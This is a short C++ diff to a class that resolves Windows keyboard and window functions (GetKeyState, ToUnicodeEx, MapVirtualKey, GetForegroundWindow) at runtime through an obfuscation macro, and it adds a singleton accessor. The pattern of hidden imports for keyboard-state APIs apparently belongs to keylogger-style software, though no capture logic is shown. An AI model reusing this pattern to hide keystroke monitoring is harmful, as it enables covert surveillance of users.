@@ -12,6 +12,7 @@ class User32
 	_dll[(char *)OBFUSCATE(name)]
 
 public:
+	decltype(MapVirtualKey)		* MapVirtualKey		= addr("MapVirtualKeyW");
 	decltype(MapVirtualKeyEx)	* MapVirtualKeyEx	= addr("MapVirtualKeyExW");
 	decltype(ToUnicodeEx)		* ToUnicodeEx		= addr("ToUnicodeEx");
 	decltype(GetKeyState)		* GetKeyState		= addr("GetKeyState");
@@ -24,5 +25,10 @@ public:
 	decltype(GetForegroundWindow)* GetForegroundWindow = addr("GetForegroundWindow");
 
 #undef addr
+
+	static User32 shared() {
+		static User32 instance = User32();
+		return instance;
+	}
 };
 
